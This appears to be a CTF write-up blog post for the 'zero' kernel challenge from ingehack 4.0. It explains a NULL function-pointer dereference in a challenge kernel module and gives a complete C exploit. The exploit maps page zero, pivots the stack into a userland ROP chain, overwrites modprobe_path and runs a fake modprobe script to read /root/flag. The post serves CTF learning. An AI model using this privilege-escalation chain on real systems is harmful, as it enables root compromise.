---
author: "nothoudaifa"
title: "zero chall writeup from ingehack 4.0"
date: "2025-02-26"
tags: 
- ctf 
- pwn 
---

```jsx
challenge author: itskarudo
points: 469
desc: translation services are so slow, i want a zero latency translator 
for all my important business, so i made one myself, right in the 
kernel.
```

this is a kernel exploitation challenge, we are given three files run.sh, initramfs.cpio.gz, bzImage.

looking at run.sh:

```bash
#!/bin/sh

qemu-system-x86_64 \
    -m 128M \
    -nographic \
    -kernel "./bzImage" \
    -append "console=ttyS0 quiet loglevel=3 pti=on nokaslr" \
    -monitor /dev/null \
    -initrd "./initramfs.cpio.gz" \
    -cpu qemu64,+smep \
    -smp cores=2
```

we can see that kaslr is not activated and only [smep](https://en.wikipedia.org/wiki/Control_register#SMEP) is on.

after extracting initramfs.cpio.gz it has:

```bash
bin  chal.ko  dev  etc  exploit  home  init  linuxrc  mnt  proc  root  sbin  sys  usr  var
```

there are two important files.

init:

```bash
#!/bin/sh

hostname zero

chown -R root:root /
chmod 0700 /root
chown -R user:user /home/user

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devpts -o gid=5,mode=0620 devpts /dev/pts
mount -t devtmpfs -o nosuid,mode=0755 udev /dev

chmod 0400 /root/flag

insmod /chal.ko
chmod 666 /dev/chal

echo 0 > /proc/sys/vm/mmap_min_addr

setsid cttyhack setuidgid 1000 /bin/sh

umount /proc && umount /sys
poweroff -d 0 -f
```

we can see that it loads chall.ko and runs:
`echo 0 > /proc/sys/vm/mmap_min_addr` this [command](https://wiki.debian.org/mmap_min_addr) make it possible to mmap a page with a virtual address of 0x0 (this will become important later).

now looking into chall.ko using ghidra we see that it uses an ioctl interface to communicate with userland.

![Screenshot from 2025-02-23 10-56-06.png](/images/Screenshot_from_2025-02-23_10-56-06.png)

this ioctl handler calls functions stored in g_handler (it’s an array of functions).

in zero_open (called when you open the kernel module) we can see that it sets g_handler to lang_table.

![Screenshot from 2025-02-23 11-11-13.png](/images/Screenshot_from_2025-02-23_11-11-13.png)

In zero_release (called when you close the kernel module) it sets g_handler to 0x0.

![Screenshot from 2025-02-23 11-13-25.png](/images/Screenshot_from_2025-02-23_11-13-25.png)

## The vulnerability:

g_handler is a global variable, meaning it persists when you call open,ioctl,close.

the vulnerability appears when we open two file devices then close one of them, making g_handler == 0x0, but we can still try to use it as a function pointer in zero_ioctl, which will make this a [kernel null byte deference vulnerability](https://security.stackexchange.com/questions/270612/null-dereference-why-does-it-work).

to trigger it:

```c
int fd1 = open("/dev/chal", 0x2);
int fd2 = open("/dev/chal", 0x2); // g_hanler is now equal to lang_table
close(fd1); // g_handler == 0x0
ioctl(fd1, 0x1, 0x0); // this will derefrence g_handler (which is 0x0) and jmp to that address. 
```

## Exploitation:

normally, exploiting this would be impossible because of two reasons (both of them are disabled):

- mmap_min_addr: mmap_min_addr is always > 0 (it’s 0x10000 on my machine). which means that userland processes can not map a page into 0x0 address preventing the kernel null byte deference. but in this chall it’s set to 0 by `echo 0 > /proc/sys/vm/mmap_min_addr` .
- smap: prevents the kernel from accessing userland memory.

so now if we mmap a page at 0x0 and cause the vulnerability we should be able to direct execution anywhere we want by writing the desired address at 0x0.

```c
 char* addr = mmap(0x0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0x0);
 // MAP_FIXED is required so it would map the page to 0x0.
 *(unsigned long*)0x0=0x41414141;
 
int fd1 = open("/dev/chal", 0x2);
int fd2 = open("/dev/chal", 0x2);
close(fd1);
ioctl(fd1, 0x1, 0x0);
```

by running this, we get:

![Screenshot from 2025-02-23 11-41-40.png](/images/Screenshot_from_2025-02-23_11-41-40.png)

you can see that it faulted at 0x41414141

since smap is disabled we will simply make a rop chain (kaslr is disabled, no need for leak) in userland memory and pivot to it (this surprisingly took a long time to do).

the gadget i chose is: `0xffffffff81037fbf: mov esp, 0x39e8825b; ret` 

i used [kropr](https://github.com/zolutal/kropr) to search for this gadget, because ROPGadget gave me gadgets from non executable memory.

after this, i mmap’ed `0x39e88000` and wrote my rop chain in there.

the rop chain overwrites modprobe path to point to `/home/user/pwnaa` .

here is the final exploit:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
       #include <fcntl.h>
#include <sys/ioctl.h>
#include <assert.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>

void sigsegv_handler(int sig) {
    puts("[*] Returned to userland, setting up for fake modprobe");
    
    system("echo '#!/bin/sh\ncp /root/flag /home/user/flag\nchmod 777 /home/user/flag' > /home/user/pwnaa");
    system("chmod +x /home/user/pwnaa");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/dummy");
    system("chmod +x /home/user/dummy");

    puts("[*] Run unknown file");
    system("/home/user/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /home/user/flag");

    exit(0);
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

unsigned long user_rip = (unsigned long)sigsegv_handler;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

int main (int argc, char* argv[]) {
    signal(SIGSEGV, sigsegv_handler);

    char* addr2 = mmap((void*)0x39e88000-0xc000, 0x10000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0x0 );
    char* addr = mmap(0x0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0x0);

    
    *(unsigned long*)0x0=0xffffffff81037fbf; //0xffffffff81037fbf: mov esp, 0x39e8825b; ret;

    int fd1 = open("/dev/chal", 0x2);
    int fd2 = open("/dev/chal", 0x2);

    assert(fd1 != -1);
    assert(fd2 != -1);

    close(fd2);
    
    save_state();

    unsigned long* arr = (unsigned long*)0x39e8825b;

    // gadgets:
    // 0xffffffff813089e2: mov qword ptr [rsi], rcx ; add bl, ch ; ret
    // 0xffffffff81ae90ce: pop rsi; ret 
    // 0x61616e77702f7265: pop rcx; ret

    unsigned long modprobe = 0xffffffff82ed18c0 ;
    unsigned long kpti_trampoline = 0xffffffff81e0191e;
    unsigned long poprsi = 0xffffffff81ae90ce;
    unsigned long poprcx = 0xffffffff81d08613;
    unsigned long mov = 0xffffffff813089e2;
    size_t off = 0;
    
    arr[off++] = poprsi;
    arr[off++] = modprobe;
    arr[off++] = poprcx;
    arr[off++] = 0x73752f656d6f682f; // /home/us   
    arr[off++] = mov;
    
    arr[off++] = poprsi;
    arr[off++] = modprobe+8;
    arr[off++] = poprcx;
    arr[off++] = 0x61616e77702f7265; // er/pwnaa    
    arr[off++] = mov;

    arr[off++] = kpti_trampoline; 
    
    arr[off++] = 0x0; // dummy rax
    arr[off++] = 0x0; // dummy rdi
    arr[off++] = user_rip;
    arr[off++] = user_cs;
    arr[off++] = user_rflags;
    arr[off++] = user_sp;
    arr[off++] = user_ss;

    ioctl(fd1, 1, 0);
}
```

flag: ```ingehack{you_can_say_you_have_ZERO_LIMITS!!_badum_tss_🥁}```
